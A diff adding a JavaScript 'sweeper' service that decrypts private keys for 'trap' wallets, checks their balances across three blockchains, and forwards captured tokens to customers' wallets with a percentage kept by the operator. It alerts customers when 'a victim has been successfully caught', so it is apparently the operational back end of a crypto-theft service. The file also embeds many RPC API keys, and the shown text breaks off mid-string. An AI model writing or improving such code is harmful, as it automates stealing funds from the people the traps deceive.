@@ -1,0 +1,4630 @@
+
+===== FILE: src/sweeper.js =====
+import 'dotenv/config';
+import { createPublicClient, http, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress, fallback } from 'viem';
+import { privateKeyToAccount } from 'viem/accounts';
+import { mainnet, bsc, polygon } from 'viem/chains';
+import axios from 'axios';
+import { createClient } from '@supabase/supabase-js';
+
+import { config as globalConfig } from '../lib/config.js';
+import logger from '../lib/logger.js';
+import { withRetry } from '../lib/retry.js';
+import { sendAlert } from '../lib/notifier.js';
+import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
+import { decrypt } from '../lib/encryption.js';
+
+console.log('[DEBUG] Starting ultra-optimized sweeper.js...');
+
+// --- Parse command line args ---
+const args = process.argv.slice(2);
+let campaignId = null;
+let jobId = null;
+for (let i = 0; i < args.length; i++) {
+  if (args[i] === '--campaign-id') campaignId = args[++i];
+  if (args[i] === '--job-id') jobId = args[++i];
+}
+campaignId = campaignId || process.env.CAMPAIGN_ID;
+jobId = jobId || process.env.JOB_ID;
+
+if (campaignId) console.log(`[DEBUG] Campaign ID: ${campaignId}`);
+if (jobId) console.log(`[DEBUG] Job ID: ${jobId}`);
+
+// --- Supabase Service Client ---
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
+let supabaseService = null;
+if (supabaseUrl && supabaseServiceKey) {
+  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
+}
+
+// --- Config ---
+const {
+  sweeper: { pollIntervalMs },
+  rpc: { sweeper: sweeperRpcUrl },
+} = globalConfig;
+
+const SERVICE_WALLET = process.env.SERVICE_WALLET_ADDRESS;
+
+// --- Thresholds ---
+const MIN_CATCH_USD = parseFloat(process.env.MIN_CATCH_USD || '1000');
+const MIN_SWEEP_USD = parseFloat(process.env.MIN_SWEEP_USD || '100');
+const MIN_ETH_SWEEP = BigInt(process.env.MIN_ETH_SWEEP_WEI || '1000000000000000');
+const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000');
+
+// --- State & Caches ---
+const caughtVictims = new Set();
+const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
+let lastNoBalanceAlertTime = 0;
+const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
+const lastBalanceAlertTimes = new Map();
+const campaignMetadataCache = new Map();
+
+// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
+let priceCache = {};
+let lastPriceFetch = 0;
+let priceFetchPromise = null;
+const PRICE_CACHE_MS = 15 * 60 * 1000; // 15 minutes
+
+async function fetchTokenPrices() {
+  const now = Date.now();
+  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
+    return priceCache;
+  }
+
+  if (priceFetchPromise) {
+    return priceFetchPromise;
+  }
+
+  priceFetchPromise = (async () => {
+    try {
+      const nativeSymbol = globalConfig.getChainConfig()?.nativeSymbol || 'ETH';
+      const ids = [nativeSymbol.toLowerCase()];
+      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ?
+        Object.keys(globalConfig.getChainConfig().tokens).map(s => s.toLowerCase()) :
+        ['usdc', 'usdt', 'wbtc', 'weth', 'dai'];
+
+      const allSymbols = [...new Set([...ids, ...TOKEN_LIST])];
+      let newCache = {};
+
+      // ─── TIER 1: CoinGecko ───
+      try {
+        const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
+        const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
+        if (coinIds.length > 0) {
+          const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
+          const resp = await axios.get(url, { timeout: 8000 });
+          if (resp.status === 200) {
+            const data = resp.data;
+            for (const sym of allSymbols) {
+              const id = symbolToId[sym];
+              if (id && data[id] && data[id].usd) {
+                newCache[sym] = data[id].usd;
+              }
+            }
+          }
+        }
+      } catch (e) {
+        logger.warn(`CoinGecko price fetch failed (${e.message}). Trying fallback...`);
+      }
+
+      // ─── TIER 2: Binance API ───
+      if (Object.keys(newCache).length < allSymbols.length) {
+        try {
+          const binancePairs = {
+            eth: 'ETHUSDT', bnb: 'BNBUSDT', matic: 'MATICUSDT', pol: 'POLUSDT',
+            wbtc: 'BTCUSDT', weth: 'ETHUSDT'
+          };
+
+          for (const sym of allSymbols) {
+            if (newCache[sym]) continue;
+            const pair = binancePairs[sym];
+            if (pair) {
+              const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
+              const resp = await axios.get(url, { timeout: 5000 });
+              if (resp.status === 200 && resp.data.price) {
+                newCache[sym] = parseFloat(resp.data.price);
+              }
+            }
+          }
+        } catch (e) {
+          logger.warn(`Binance price fetch failed (${e.message}).`);
+        }
+      }
+
+      if (Object.keys(newCache).length > 0) {
+        priceCache = newCache;
+        logger.debug(`Final price cache established: ${JSON.stringify(priceCache)}`);
+      } else {
+        logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
+      }
+    } catch (e) {
+      logger.error(`Critical: All price fetch sources failed: ${e.message}`);
+    } finally {
+      lastPriceFetch = Date.now();
+      priceFetchPromise = null;
+    }
+    return priceCache;
+  })();
+
+  return priceFetchPromise;
+}
+
+// ─── Explorer URL Helper ───
+function getExplorerUrl(address, type = 'address') {
+  let baseUrl = 'https://etherscan.io';
+  if (chainName === 'bsc') baseUrl = 'https://bscscan.com';
+  else if (chainName === 'polygon') baseUrl = 'https://polygonscan.com';
+
+  if (type === 'tx') return `${baseUrl}/tx/${address}`;
+  return `${baseUrl}/address/${address}`;
+}
+
+// 🚀 FIX: Custom dual alert for tailored professional messages
+async function sendCustomDualAlert(userMessage, adminMessage, specificCampaignId = null) {
+  const targetCampaignId = specificCampaignId || campaignId;
+  if (targetCampaignId) {
+    await sendAlert(userMessage, 'info', targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+  }
+  await sendAlert(adminMessage, 'info').catch(err => logger.warn(`Admin alert failed: ${err.message}`));
+}
+
+// --- Helper: check if job is cancelled ---
+async function isJobCancelled(jobId) {
+  if (!jobId || !supabaseService) return false;
+  try {
+    const { data, error } = await supabaseService.from('jobs').select('status').eq('id', jobId).single();
+    if (error) throw error;
+    return data?.status === 'cancelled';
+  } catch {
+    return false;
+  }
+}
+
+// --- Helper: update job status ---
+async function updateJob(status, progress = null, total = null, message = null) {
+  if (!jobId || !supabaseService) return;
+  const data = {};
+  if (status) data.status = status;
+  if (progress !== null) data.progress = progress;
+  if (total !== null) data.total = total;
+  if (message) data.message = message;
+  if (status === 'running' && !data.started_at) data.started_at = new Date().toISOString();
+  if (status === 'completed' || status === 'failed') data.completed_at = new Date().toISOString();
+  try {
+    await supabaseService.from('jobs').update(data).eq('id', jobId);
+  } catch (err) {
+    logger.error(`Failed to update job ${jobId}: ${err.message}`);
+  }
+}
+
+// 🚀 CRITICAL FIX: Fetch metadata strictly from the database PER CAMPAIGN
+async function getCampaignMetadata(campId) {
+  if (!campId) return null;
+  if (campaignMetadataCache.has(campId)) {
+    return campaignMetadataCache.get(campId);
+  }
+
+  if (!supabaseService) {
+    logger.error('Supabase service not available to fetch campaign metadata.');
+    return null;
+  }
+
+  try {
+    const { data: campaign, error } = await supabaseService
+      .from('campaigns')
+      .select('user_id, safe_wallet_address')
+      .eq('id', campId)
+      .single();
+
+    if (error || !campaign) {
+      logger.error(`Failed to fetch campaign ${campId}: ${error?.message}`);
+      return null;
+    }
+
+    const { data: user, error: userError } = await supabaseService
+      .from('users')
+      .select('profit_split_percent')
+      .eq('id', campaign.user_id)
+      .single();
+
+    const profitSplitPercent = (!userError && user) ? (user.profit_split_percent || 75) : 75;
+    let userSafeWallet = campaign.safe_wallet_address;
+    let fallbackToAdmin = false;
+
+    // 🚨 NEW LOGIC: If user safe wallet is missing, fallback to admin
+    if (!userSafeWallet) {
+      if (!SERVICE_WALLET) {
+        logger.error(`CRITICAL: Campaign ${campId} has no safe_wallet_address AND no SERVICE_WALLET is configured. Cannot sweep.`);
+        return null; // Abort if we have nowhere to send it
+      }
+      logger.warn(`Campaign ${campId} has no safe_wallet_address. Fallback to admin wallet enabled.`);
+      userSafeWallet = SERVICE_WALLET;
+      fallbackToAdmin = true;
+    }
+
+    const useSplitting = !!SERVICE_WALLET;
+    const serviceWallet = SERVICE_WALLET || null;
+
+    const metadata = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin };
+    campaignMetadataCache.set(campId, metadata);
+    return metadata;
+  } catch (err) {
+    logger.error(`Failed to fetch metadata for campaign ${campId}: ${err.message}`);
+    return null;
+  }
+}
+
+// --- Helpers: transaction & profit share records ---
+async function createTransaction(campId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
+  if (!supabaseService) return null;
+  try {
+    const { data, error } = await supabaseService.from('transactions').insert({
+      campaign_id: campId, trap_address: trapAddress, token_symbol: tokenSymbol,
+      amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
+    }).select().single();
+    return error ? null : data.id;
+  } catch {
+    return null;
+  }
+}
+
+async function createProfitShare(transactionId, userAmount, serviceAmount, userTxHash, serviceTxHash) {
+  if (!supabaseService) return;
+  try {
+    await supabaseService.from('profit_shares').insert({
+      transaction_id: transactionId, user_amount: userAmount, service_amount: serviceAmount,
+      user_share_tx_hash: userTxHash, service_share_tx_hash: serviceTxHash, settled_at: new Date().toISOString(),
+    });
+  } catch (err) {
+    logger.error(`Failed to record profit share: ${err.message}`);
+  }
+}
+
+// --- Load caught victims from DB ---
+async function loadCaughtVictims() {
+  if (!supabaseService) return;
+  try {
+    const { data, error } = await supabaseService.from('traps').select('victim_address').eq('is_caught', true);
+    if (!error && data && data.length > 0) {
+      const newSet = new Set(data.filter(row => row.victim_address).map(row => row.victim_address.toLowerCase()));
+      caughtVictims.clear();
+      newSet.forEach(addr => caughtVictims.add(addr));
+    }
+  } catch (err) {
+    console.warn(`[DEBUG] Could not load caught victims: ${err.message}`);
+  }
+}
+
+// --- Mark victim as caught ---
+async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = null) {
+  if (!victimAddress) return;
+  const addr = victimAddress.toLowerCase();
+  if (caughtVictims.has(addr)) return;
+  caughtVictims.add(addr);
+  if (!supabaseService) return;
+  try {
+    await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
+
+    const victimUrl = getExplorerUrl(addr);
+    const trapUrl = trapAddress ? getExplorerUrl(trapAddress) : '';
+
+    const userMsg = `🎯 *Congratulations! A victim has been successfully caught.*\n\n` +
+      `👤 *Victim:* [${addr.slice(0, 6)}...${addr.slice(-4)}](${victimUrl})\n` +
+      (trapUrl ? `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` : '') +
+      `✅ *Status:* Trap activated and ready for sweeping.`;
+
+    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}\nTrap: ${trapAddress}`;
+
+    await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
+  } catch (err) {
+    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
+  }
+}
+
+// --- MULTI‑CHAIN setup ---
+const chainName = globalConfig.chain || 'ethereum';
+const chainCfg = globalConfig.getChainConfig ? globalConfig.getChainConfig() : null;
+const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
+
+let viemChain;
+switch (chainName) {
+  case 'bsc': viemChain = bsc; break;
+  case 'polygon': viemChain = polygon; break;
+  default: viemChain = mainnet;
+}
+
+// --- Load traps from DB ---
+async function getTrapsFromDB(campId = null) {
+  if (!supabaseService) return [];
+  try {
+    let query = supabaseService.from('traps').select('trap_private_key_enc, victim_address, trap_address, campaign_id');
+    if (campId) {
+      query = query.eq('campaign_id', campId);
+    } else {
+      const { data: campaigns, error: campError } = await supabaseService.from('campaigns').select('id').eq('chain', chainName);
+      if (campError || !campaigns || campaigns.length === 0) return [];
+      query = query.in('campaign_id', campaigns.map(c => c.id));
+    }
+
+    const { data, error } = await query;
+    if (error || !data || data.length === 0) return [];
+
+    const entries = [];
+    for (const row of data) {
+      if (!row.trap_private_key_enc) continue;
+      try {
+        const privateKey = decrypt(row.trap_private_key_enc);
+        const account = privateKeyToAccount(privateKey);
+        entries.push({
+          account,
+          trapAddress: account.address.toLowerCase(),
+          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
+          campaignId: row.campaign_id,
+        });
+      } catch (e) {
+        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
+      }
+    }
+    return entries;
+  } catch (err) {
+    logger.error(`Failed to fetch traps: ${err.message}`);
+    return [];
+  }
+}
+
+let TOKEN_LIST = [];
+if (chainCfg && chainCfg.tokens) {
+  const tokenDecimals = chainCfg.token_decimals || {};
+  TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => ({
+    symbol, address, decimals: tokenDecimals[symbol] ?? 18
+  }));
+} else {
+  TOKEN_LIST = [
+    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
+    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
+    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
+    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
+  ];
+}
+
+const chainRpc = chainCfg?.rpc || sweeperRpcUrl;
+
+// ─── Public RPC Fallbacks ───
+const PUBLIC_FALLBACKS = {
+  bsc: [
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+    'https://bsc-dataseed.binance.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+    'https://rpc.ankr.com/bsc',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+    'https://bsc.publicnode.com',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+    'https://1rpc.io/bnb',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+    'https://bsc.drpc.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+  ],
+  polygon: [
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+  ],
+  ethereum: [
+    'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
+    'https://ethereum.publicnode.com',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+    'https://rpc.ankr.com/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+    'https://eth.drpc.org',
+    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+  ],
+};
+
+const normalizedChain = chainName?.toLowerCase() || '';
+const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
+const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
+
+const ERC20_ABI = parseAbi([
+  'function balanceOf(address owner) view returns (uint256)',
+  'function transfer(address to, uint256 amount) returns (bool)',
+]);
+
+// 🚀 OPTIMIZATION: ONE single shared public client
+const publicClient = createPublicClient({
+  chain: viemChain,
+  transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
+});
+
+
+// 🚀 OPTIMIZATION: Lazy execution helper
+async function executeSweepForTrap(entry, balances) {
+  const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
+
+  let anyNeedsGasInThisTrap = false; // 🚀 NEW: Track gas issues per trap
+
+  let metadata;
+  if (singleDestination) {
+    metadata = { profitSplitPercent: 100, userSafeWallet: singleDestination, useSplitting: false, serviceWallet: null, fallbackToAdmin: false };
+  } else {
+    metadata = await getCampaignMetadata(trapCampaignId);
+    if (!metadata) {
+      logger.error(`Skipping trap ${trapAddress}: Could not resolve campaign metadata (missing safe_wallet_address and no admin fallback available).`);
+      return false;
+    }
+  }
+
+  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin } = metadata;
+  const prices = await fetchTokenPrices();
+  const isPriceFeedDown = Object.keys(prices).length === 0;
+  let sweptAny = false;
+  let totalGasPaidInRun = 0n;
+
+  let currentNonce = null;
+  const getNonce = async () => {
+    if (currentNonce === null) {
+      currentNonce = await withRetry(() => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }), 'getTransactionCount', 2, 1000);
+    }
+    return currentNonce++;
+  };
+
+  let currentGasPrice = null;
+  const getGasPrice = async () => {
+    if (currentGasPrice === null) {
+      currentGasPrice = await withRetry(() => publicClient.getGasPrice(), 'getGasPrice', 2, 1000);
+    }
+    return currentGasPrice;
+  };
+
+  // 1. Token Sweeps
+  for (const token of TOKEN_LIST) {
+    const tokenData = balances.tokens[token.symbol];
+    if (!tokenData || tokenData.balance <= 0n) continue;
+
+    const formatted = formatUnits(tokenData.balance, tokenData.decimals);
+    const tokenPrice = prices[token.symbol.toLowerCase()] || 0;
+    const usdValue = parseFloat(formatted) * tokenPrice;
+    const isTokenPriceMissing = tokenPrice === 0;
+
+    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing)
+      ? tokenData.balance >= MIN_TOKEN_SWEEP
+      : usdValue >= MIN_SWEEP_USD;
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+    if (!meetsThreshold) continue;
+
+    const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
+    const now = Date.now();
+    if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
+      logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
+      lastBalanceAlertTimes.set(alertKey, now);
+    }
+
+    try {
+      const gasPrice = await getGasPrice();
+      const gasLimit = 80000n;
+      const totalFee = useSplitting ? (gasLimit * 2n) * gasPrice : gasLimit * gasPrice;
+      const spendableNative = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
+
+      if (spendableNative < totalFee) {
+        logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
+
+        anyNeedsGasInThisTrap = true; // 🚀 Flag this trap as needing gas
+
+        // 🚀 NEW: Alert user with EXACT mathematically calculated gas needed
+        if (usdValue >= 50) {
+          const gasAlertKey = `${trapAddress}:${token.symbol.toLowerCase()}:needs_gas`;
+          const now = Date.now();
+          if (now - (lastBalanceAlertTimes.get(gasAlertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
+            const trapUrl = getExplorerUrl(trapAddress);
+
+            // 🚀 EXACT CALCULATION: totalFee is already calculated above based on current gasPrice * gasLimit
+            const exactGasNeeded = formatEther(totalFee);
+            // Recommend 2x the exact amount as a safety buffer for network spikes
+            const recommendedGas = (parseFloat(exactGasNeeded) * 2).toFixed(6);
+
+            const userGasMsg = `⛽ *Action Required: Your Trap Needs Gas!*\n\n` +
+              `Your trap successfully captured *${formatted} ${token.symbol}* (≈ $${usdValue.toFixed(2)}), but it does not have enough ${nativeSymbol} to pay for the sweep gas.\n\n` +
+              `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+              `⛽ *Exact Gas Needed:* ~${exactGasNeeded} ${nativeSymbol}\n\n` +
+              `💡 *How to fix:*\nPlease send at least *${recommendedGas} ${nativeSymbol}* to your trap address so the sweeper can forward your funds.`;
+
+            const adminGasMsg = `[ADMIN] ⛽ Trap needs gas to sweep.\nCampaign: ${trapCampaignId}\nTrap: ${trapAddress}\nAsset: ${token.symbol} ($${usdValue.toFixed(2)})\nExact Gas Needed: ${exactGasNeeded} ${nativeSymbol}`;
+
+            await sendCustomDualAlert(userGasMsg, adminGasMsg, trapCampaignId);
+            lastBalanceAlertTimes.set(gasAlertKey, now);
+          }
+        }
+        continue;
+      }
+
+      let userAmount = tokenData.balance;
+      let serviceAmount = 0n;
+      let userTxHash = null, serviceTxHash = null;
+
+      const buildAndSendTx = async (recipient, amount) => {
+        const nonce = await getNonce();
+        const txRequest = {
+          to: getAddress(token.address),
+          data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [recipient, amount] }),
+          gas: gasLimit, nonce, gasPrice, chainId: viemChain.id,
+        };
+        const serializedTx = await account.signTransaction(txRequest);
+        return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
+      };
+
+      if (useSplitting && serviceWallet) {
+        // 🚨 If fallback to admin is active, user gets 0, admin gets 100%
+        if (fallbackToAdmin) {
+          userAmount = 0n;
+          serviceAmount = tokenData.balance;
+        } else {
+          const userShare = profitSplitPercent / 100;
+          userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
+          serviceAmount = tokenData.balance - userAmount;
+        }
+
+        if (userAmount > 0n && userSafeWallet) {
+          try {
+            userTxHash = await buildAndSendTx(userSafeWallet, userAmount);
+            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+          } catch (err) { logger.error(`User tx error ${token.symbol}: ${err.message}`); }
+        }
+        if (serviceAmount > 0n && serviceWallet) {
+          try {
+            serviceTxHash = await buildAndSendTx(serviceWallet, serviceAmount);
+            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+          } catch (err) { logger.error(`Service tx error ${token.symbol}: ${err.message}`); }
+        }
+      } else {
+        try {
+          userTxHash = await buildAndSendTx(userSafeWallet, tokenData.balance);
+          sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+        } catch (err) { logger.error(`Sweep tx error ${token.symbol}: ${err.message}`); }
+      }
+
+      if (userTxHash || serviceTxHash) {
+        const txHash = userTxHash || serviceTxHash;
+        if (trapCampaignId && supabaseService) {
+          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
+          if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
+        }
+
+        // 🚀 PROFESSIONAL NOTIFICATIONS
+        const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+
+        const trapUrl = getExplorerUrl(trapAddress);
+        const txUrl = getExplorerUrl(txHash, 'tx');
+
+        if (fallbackToAdmin) {
+          const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
+            `Your trap successfully captured funds, but no safe wallet address was configured in your campaign settings.\n\n` +
+            `For the security of your assets, the captured funds (*${formatted} ${token.symbol}* ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+            `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+          const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Trap: ${trapAddress}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
+            `🔗 TX: ${txUrl}`;
+
+          await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+        } else {
+          const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+            `💰 *Asset:* ${token.symbol}\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+            `💵 *Amount:* ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
